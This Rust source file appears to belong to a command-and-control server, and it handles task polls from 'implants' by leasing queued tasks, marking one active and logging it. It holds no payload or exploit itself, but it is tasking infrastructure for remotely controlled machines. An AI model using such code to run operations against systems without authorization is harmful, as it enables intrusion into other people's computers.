use std::{
    future::Future,
    io::{Error, ErrorKind},
    pin::Pin,
    str::FromStr,
    sync::Arc,
};

use hyper::StatusCode;
use serde_json::json;
use uuid::Uuid;

use crate::core::{
    activity::ActivitySeverity, app::ServerContext, packet::Packet, router::PacketReply,
    tasks::FetchTaskRequest,
};

/// Handles a task-poll packet and leases queued work to the implant.
///
/// Flow:
///
///   packet
///      -> parse FetchTaskRequest
///      -> parse clientid from envelope
///      -> lease queued tasks
///      -> mark first leased task as active
///      -> reply with serialized task envelopes
///
/// @param context Shared application state used to lease tasks.
/// @param packet Parsed packet envelope containing the fetch request.
/// @return Future that resolves to the packet reply sent back to the implant.
pub fn handle(
    context: Arc<ServerContext>,
    packet: Packet,
) -> Pin<Box<dyn Future<Output = PacketReply> + Send>> {
    Box::pin(async move {
        match packet.parse_data::<FetchTaskRequest>() {
            Ok(request) => match parse_clientid(packet.clientid()) {
                Ok(clientid) => {
                    let want = request.want.unwrap_or(1).min(10);
                    match context
                        .fetch_tasks_for_implant(clientid, want)
                        .await
                    {
                        Ok(response) => {
                            context
                                .implants()
                                .set_active_task(
                                    clientid,
                                    response.tasks.first().map(|task| task.task_id),
                                )
                                .await;
                            if let Some(task) = response.tasks.first() {
                                context
                                    .record_activity(
                                        ActivitySeverity::Info,
                                        format!("leased {} for {}", task.task_type, clientid),
                                        Some(clientid),
                                        Some(task.task_id),
                                    )
                                    .await;
                            }

                            PacketReply::packet(
                                StatusCode::OK,
                                packet.opcode_kind(),
                                packet.clientid(),
                                &response,
                            )
                        }
                        Err(err) => error_reply(&packet, StatusCode::BAD_REQUEST, &err.to_string()),
                    }
                }
                Err(err) => error_reply(&packet, StatusCode::BAD_REQUEST, &err.to_string()),
            },
            Err(err) => error_reply(&packet, StatusCode::BAD_REQUEST, &err.to_string()),
        }
    })
}

fn parse_clientid(clientid: &str) -> Result<Uuid, Error> {
    Uuid::from_str(clientid).map_err(|e| Error::new(ErrorKind::InvalidInput, e.to_string()))
}

fn error_reply(packet: &Packet, status: StatusCode, message: &str) -> PacketReply {
    PacketReply::packet(
        status,
        packet.opcode_kind(),
        packet.clientid(),
        &json!({
            "status": "error",
            "message": message,
        }),
    )
}
